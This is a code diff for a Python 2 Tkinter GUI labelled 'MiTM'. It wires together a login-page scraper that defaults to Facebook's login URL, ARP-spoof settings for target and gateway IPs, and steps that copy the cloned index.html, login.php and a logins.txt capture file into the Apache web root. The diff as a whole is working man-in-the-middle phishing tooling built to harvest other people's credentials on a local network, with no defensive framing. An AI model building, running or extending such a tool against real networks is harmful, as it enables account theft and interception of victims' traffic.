@@ -4,6 +4,10 @@ import re
 import Tkinter as tk
 import os
 import subprocess
+import shutil
+
+# Need to change /etc/apache2/sites-available/default first if changing this var!!!
+apacheServerDir = "/var/www"
 
 root = tk.Tk()
 
@@ -11,7 +15,7 @@ root.title("Welcome to MiTM")
 
 scrapperLabel = tk.Label(root, text="--------- Scrapper Setup ---------")
 scrapperUrlLabel = tk.Label(root, text="Enter Scrapper URL")
-scrapperOutLabel = tk.Label(root, text="Enter Scrapper Output File Name")
+scrapperOutLabel = tk.Label(root, text="Enter Scrapper Output File Name (Optional)")
 
 spoofLabel = tk.Label(root, text="--------- ArpSpoof Setup ---------")
 spoofTargetLabel = tk.Label(root, text="Enter ArpSpoof Target's IP Address")
@@ -37,7 +41,7 @@ spoofTargetVar = tk.StringVar()
 spoofHostVar = tk.StringVar()
 
 scrapperUrlVar.set("http://facebook.com/login")
-scrapperOutVar.set("facebook")
+scrapperOutVar.set("")
 spoofTargetVar.set("192.168.1.1")
 spoofHostVar.set("192.168.1.0")
 
@@ -81,6 +85,8 @@ def validate_inputs():
         errorLabel1.grid(column=0, row=5, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
     if matchScrapperOut:
         errorLabel2.grid_remove()
+    elif not scrapperOutEntry.get().strip():
+        errorLabel2.grid_remove()
     else:
         errorLabel2.grid(column=0, row=7, columnspan=2, ipadx=2, ipady=2, padx=2, pady=2)
     if matchSpoofTarget:
@@ -95,6 +101,8 @@ def validate_inputs():
     root.update_idletasks()
 
     if matchScrapperUrl and matchScrapperOut and matchSpoofTarget and matchSpoofHost:
+        accept_inputs()
+    elif matchScrapperUrl and not scrapperOutEntry.get().strip() and matchSpoofTarget and matchSpoofHost:
         accept_inputs()
     else:
         deny_inputs()
@@ -117,7 +125,12 @@ def accept_inputs():
     print p.communicate(), "\n"
 
     if os.path.isfile(scrapperOut + 'login.php') and os.path.isfile(scrapperOut + 'index.html'):
-        cmd = "python ./route.py " + scrapperUrl + " " + scrapperOut
+        shutil.copy(scrapperOut + "index.html", apacheServerDir)
+        shutil.copy(scrapperOut + "login.php", apacheServerDir)
+        if not os.path.exists('logins.txt'):
+            open('logins.txt', 'w').close()
+        shutil.copy("logins.txt", apacheServerDir)
+        cmd = "python ./route.py"
         p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
         print cmd
         route_status = p.wait()
